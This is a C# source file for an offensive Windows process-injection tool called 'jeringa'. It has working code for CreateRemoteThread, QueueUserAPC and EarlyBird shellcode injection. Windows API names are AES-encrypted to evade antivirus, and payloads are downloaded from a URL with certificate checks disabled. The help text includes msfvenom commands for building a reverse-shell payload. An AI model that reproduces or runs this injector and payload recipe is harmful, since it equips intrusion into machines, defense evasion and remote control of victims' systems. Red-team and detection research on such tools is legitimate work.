﻿using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Security.Principal;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace jeringa
{
    class Program
    {
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        // If you change these 2 values you will have to change the AES-encrypted DLL and function names
        static String password = "ricardojoserf   "; 
        static String iv = "jeringa jeringa "; 
        // If you update these 2 values, update it in payloadEncryptor
        static String payload_aes_password = "ricardojoserf123ricardojoserf123"; 
        static String payload_aes_iv = "jeringa1jeringa1"; 

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);
        delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        delegate bool CloseHandleDelegate(IntPtr hObject);
        delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        delegate uint QueueUserAPCDelegate(IntPtr pfnAPC, IntPtr hThread, uint dwData);
        delegate uint ResumeThreadDelegate(IntPtr hThread);
        delegate IntPtr OpenThreadDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);


        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV"); 
            string plaintext = null;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }
            return plaintext;
        }


        private static string getProcessOwner(Process process)
        {
            IntPtr processHandle = IntPtr.Zero;
            try
            {
                String decryptedAdvapi32 = DecryptStringFromBytes("9dOYL40gX4b0hNu/qgaXgA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
                String decryptedOpenProcessToken = DecryptStringFromBytes("sF3ICi5AMd+hES18ADsvonBk3cp8AKV1ZyuKqaotGS8=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

                IntPtr a32 = GetModuleHandle(decryptedAdvapi32);
                IntPtr addrOpenProcessToken = GetProcAddress(a32, decryptedOpenProcessToken);
                OpenProcessTokenDelegate auxOpenProcessToken = (OpenProcessTokenDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcessToken, typeof(OpenProcessTokenDelegate));
                auxOpenProcessToken(process.Handle, 8, out processHandle);
                WindowsIdentity wi = new WindowsIdentity(processHandle);
                string user = wi.Name;
                return user;
            }
            catch
            {
                return "N/A";
            }
            finally
            {
                if (processHandle != IntPtr.Zero)
                {
                    String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
                    String decryptedCloseHandle = DecryptStringFromBytes("raaWfwu7TWCs4mgnq8Pytg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

                    IntPtr k32 = GetModuleHandle(decryptedKernel32);
                    IntPtr addrCloseHandle = GetProcAddress(k32, decryptedCloseHandle);
                    CloseHandleDelegate auxCloseHandle = (CloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(addrCloseHandle, typeof(CloseHandleDelegate));
                    auxCloseHandle(processHandle);
                }
            }
        }


        static Dictionary<string, string> getProcessPids(String process_name)
        {
            Dictionary<string, string> user_pid = new Dictionary<string, string>();
            Process[] processCollection = { };
            if (process_name == "all")
            {
                processCollection = Process.GetProcesses();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess);
                    String pid = targetProcess.Id.ToString();
                    user_pid.Add(pid, processOwner);
                }
            }
            else
            {
                processCollection = Process.GetProcesses();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess);
                    if ((targetProcess.ProcessName.ToLower() == process_name.ToLower()) || (processOwner.ToLower().Contains(process_name.ToLower())))
                    {
                        String pid = targetProcess.Id.ToString();
                        user_pid.Add(pid, processOwner);
                    }
                }
            }

            return user_pid;
        }


        public static byte[] ToByteArray(String hexString)
        {
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }


        static byte[] tryToDecryptString(String payload_str)
        {
            try
            {
                String decryptedPayload = DecryptStringFromBytes(payload_str, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
                byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
                Console.WriteLine("[+] It was possible to decrypt the payload.");
                return decryptedBytes;
            }
            catch
            {
                // Console.WriteLine("[-] It was not possible to decrypt the payload - Probably not using AES encryption.");
                return ToByteArray(payload_str);
            }
        }


        static byte[] tryToDecryptFile(byte[] encryptedBytes)
        {
            try
            {
                String encryptedPayload = Convert.ToBase64String(encryptedBytes);
                String decryptedPayload = DecryptStringFromBytes(encryptedPayload, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
                byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
                Console.WriteLine("[+] It was possible to decrypt the payload.");
                return decryptedBytes;
            }
            catch
            {
                // Console.WriteLine("[-] It was not possible to decrypt the file - Probably not using AES encryption.");
                return encryptedBytes;

            }
        }


        static byte[] getPayload(String payload_str)
        {
            // Payload from standard input
            if (payload_str == null)
            {
                byte[] inputBuffer = new byte[1024];
                Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);
                Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));
                Console.WriteLine("[+] Write hexadecimal payload or url (or Enter to exit):");
                payload_str = Console.ReadLine();
            }

            byte[] buf = { };
            if (payload_str == "")
            {
                Console.WriteLine("[-] Exiting...");
                System.Environment.Exit(0);
            }

            // Payload from url, http or https
            else if (payload_str.Substring(0, 4) == "http") {
                Console.WriteLine("[+] Getting payload from url: "+ payload_str);
                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
                using (System.Net.WebClient myWebClient = new System.Net.WebClient())
                {
                    try
                    {
                        System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                        buf = myWebClient.DownloadData(payload_str);
                        buf = tryToDecryptFile(buf);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }

            }

            // Hexadecimal payload
            else
            {
                buf = tryToDecryptString(payload_str);
            }

            return buf;
        }


        static void injectShellcodeCreateRemoteThread(String processPID, String payload)
        {
            RijndaelManaged myRijndael = new RijndaelManaged();

            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            IntPtr k32 = GetModuleHandle(decryptedKernel32);
           
            String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedCreateRemoteThread = DecryptStringFromBytes("EcLQmi+4wHc4weGwjNgqCQe+1LyC2VMgE3xKs7JyhZY=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrOpenProcess = GetProcAddress(k32, decryptedOpenProcess);
            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrCreateRemoteThread = GetProcAddress(k32, decryptedCreateRemoteThread);
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            CreateRemoteThreadDelegate auxCreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateRemoteThread, typeof(CreateRemoteThreadDelegate));

            byte[] buf = getPayload(payload);

            Process process = Process.GetProcessById(Int32.Parse(processPID));
            String processname = process.ProcessName;
            String owner = getProcessOwner(process);
            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));

            if (hProcess != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
            }

            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            
            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
            IntPtr hThread = auxCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }


        static void injectShellcodeQueueUserAPC(String processPID, String payload)
        {
            RijndaelManaged myRijndael = new RijndaelManaged();

            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            IntPtr k32 = GetModuleHandle(decryptedKernel32);


            String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedOpenThread = DecryptStringFromBytes("ATZJvFQXpEJm5R5ff90mOA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrOpenProcess = GetProcAddress(k32, decryptedOpenProcess);
            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
            IntPtr addrOpenThread = GetProcAddress(k32, decryptedOpenThread);
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)Marshal.GetDelegateForFunctionPointer(addrQueueUserAPC, typeof(QueueUserAPCDelegate));
            OpenThreadDelegate auxOpenThread = (OpenThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenThread, typeof(OpenThreadDelegate));

            byte[] buf = getPayload(payload);

            Process process = Process.GetProcessById(Int32.Parse(processPID));
            String processname = process.ProcessName;
            String owner = getProcessOwner(process);
            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int32.Parse(processPID));

            if (hProcess != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process {0} (\"{1}\" owned by \"{2}\") created correctly.", processPID, processname, owner);
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process {0} (\"{1}\" owned by \"{2}\") is NULL.", processPID, processname, owner);
            }

            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x20); // 0x20: PAGE_EXECUTE_READ; 0x1000 = MEM_COMMIT
            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
            ProcessThread hThread = Process.GetProcessById(Int16.Parse(processPID)).Threads[0];
            IntPtr hThreadId = auxOpenThread(0x0010, false, (uint)hThread.Id);
            auxQueueUserAPC(addr, hThreadId, 0);
        }


        static void injectShellcodeEarlyBird(String processname, String payload)
        {
            RijndaelManaged myRijndael = new RijndaelManaged();

            String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            IntPtr k32 = GetModuleHandle(decryptedKernel32);

            String decryptedCreateProcessA = DecryptStringFromBytes("2FXtT/hu7ZEj8oz79680TQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedResumeThread = DecryptStringFromBytes("uINo0LSuz3QttywZS2AsBw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrCreateProcess = GetProcAddress(k32, decryptedCreateProcessA);
            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
            IntPtr addrResumeThread = GetProcAddress(k32, decryptedResumeThread);
            CreateProcessDelegate auxCreateProcess = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateProcess, typeof(CreateProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)Marshal.GetDelegateForFunctionPointer(addrQueueUserAPC, typeof(QueueUserAPCDelegate));
            ResumeThreadDelegate auxResumeThread = (ResumeThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrResumeThread, typeof(ResumeThreadDelegate));

            byte[] buf = getPayload(payload);

            // https://www.codeproject.com/Articles/230005/Launch-a-process-suspended
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            var pi = new PROCESS_INFORMATION();
            bool success = auxCreateProcess(processname, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine("[+] Trying to spawn a suspended process for "+processname);
            if (success)
            {
                Console.WriteLine("[+] Process created correctly");
            }
            else {
                Console.WriteLine("[-] Process failed to create");
                System.Environment.Exit(0);
            }

            Console.WriteLine("[+] Process PID: " + pi.dwProcessId);
            Console.WriteLine("[+] Thread ID:   " + pi.dwThreadId);
            var baseAddress = auxVirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x20);
            auxWriteProcessMemory(pi.hProcess, baseAddress, buf, buf.Length, out _);
            auxQueueUserAPC(baseAddress, pi.hThread, 0);
            auxResumeThread(pi.hThread);
        }


        static void listInfo(Dictionary<string, string> processPIDs)
        {
            Console.WriteLine("{0,40} | {1,10} | {2,20}", "Process Name", "PID", "Process Owner");
            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 80)));
            foreach (KeyValuePair<string, string> kvp in processPIDs)
            {
                Console.WriteLine("{0,40} | {1,10} | {2,20}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
            }
        }


        static void getHelp()
        {
            Console.WriteLine("    _           _                   \r\n   (_)         (_)                  \r\n    _  ___ _ __ _ _ __   __ _  __ _ \r\n   | |/ _ \\ '__| | '_ \\ / _` |/ _` |\r\n   | |  __/ |  | | | | | (_| | (_| |\r\n   | |\\___|_|  |_|_| |_|\\__, |\\__,_|\r\n  _/ |                   __/ |      \r\n |__/                   |___/     \n\n");

            Console.WriteLine("[+] Option \"list\" to  enumerate all processes or filter by name or owner.\n");
            Console.WriteLine("jeringa.exe list [ all | PROCESS_NAME | PROCESS_OWNER]\r\n");
            Console.WriteLine("[*] Example - List all processes:");
            Console.WriteLine("jeringa.exe list all");
            Console.WriteLine("[*] Example - List processes with a specific name (\"explorer\") or process owner (\"DESKTOP-MA54241\\ricardo\"):");
            Console.WriteLine("jeringa.exe list explorer\r\njeringa.exe list \"DESKTOP-MA54241\\ricardo\"");
            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));

            Console.WriteLine("[+] Injection \"inject-crt\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)\n");
            Console.WriteLine("jeringa.exe inject-crt [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
            Console.WriteLine("[*] Example - Injection using process name, process owner and payload in HEX format:");
            Console.WriteLine("jeringa.exe inject-crt explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
            Console.WriteLine("[*] Example - Injection using PID (\"1234\") and a url to download the payload:");
            Console.WriteLine("jeringa.exe inject-crt 1234 http://127.0.0.1/payload.bin");
            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));

            Console.WriteLine("[+] Injection \"inject-apc\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)\n");
            Console.WriteLine("jeringa.exe inject-apc [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
            Console.WriteLine("[*] Example - Injection using process name, process owner and payload in HEX format:");
            Console.WriteLine("jeringa.exe inject-apc explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
            Console.WriteLine("[*] Example - Injection using PID (\"1234\") and a url to download the payload:");
            Console.WriteLine("jeringa.exe inject-apc 1234 http://127.0.0.1/payload.bin");
            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));

            Console.WriteLine("[+] Injection \"earlybird\" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)\n");
            Console.WriteLine("jeringa.exe earlybird PROGRAM_PATH [ HEX_PAYLOAD | URL]\r\n");
            Console.WriteLine("[*] Example - Injection using program path and payload in HEX format:");
            Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\notepad.exe\" fc4883e4f0e8...");
            Console.WriteLine("[*] Example - Injection using program path and a url to download the payload:");
            Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\calc.exe\" http://127.0.0.1/payload.bin");
            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));

            Console.WriteLine("[+] Payload generation\n");
            Console.WriteLine("[*] Example - Create payload in HEX format using Msfvenom with:");
            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'");
            Console.WriteLine("[*] Example - Create payload in raw format for url option using Msfvenom with:");
            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw > payload.bin");

            System.Environment.Exit(0);
        }


        static bool checkElevated() {
            if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                return false;
            }
            return true;
        }


        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                getHelp();
            }

            string option = args[0];
            string process_str = args[1];

            if (option == "list")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                listInfo(processPIDs);
                
            }

            else if (option == "inject-crt")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeCreateRemoteThread(process_str, payload);
                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeCreateRemoteThread(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

            else if (option == "inject-apc")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeQueueUserAPC(process_str, payload);
                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeQueueUserAPC(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

            else if (option == "earlybird")
            {
                string payload;
                if (args.Length == 3)
                {
                    payload = args[2];
                }
                else
                {
                    payload = null;
                }
                injectShellcodeEarlyBird(process_str, payload);
            }
        }

    }

}
